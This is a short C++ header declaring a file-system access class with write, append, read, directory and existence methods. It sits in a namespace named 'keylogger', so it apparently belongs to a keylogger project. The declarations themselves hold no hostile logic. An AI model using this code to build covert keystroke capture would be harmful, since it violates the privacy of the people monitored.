#pragma once

#include "FileSystemAccess.h"

namespace keylogger
{
class DefaultFileSystemAccess : public FileSystemAccess
{
public:
    void tryToWrite(const std::string& absolutePath, const std::string& content) const override;
    void tryToAppend(const std::string& absolutePath, const std::string& content) const override;
    std::string tryToReadContent(const std::string& absolutePath) const override;
    void createDirectory(const std::string& absolutePath) const override;
    bool exists(const std::string& absolutePath) const override;
};
}
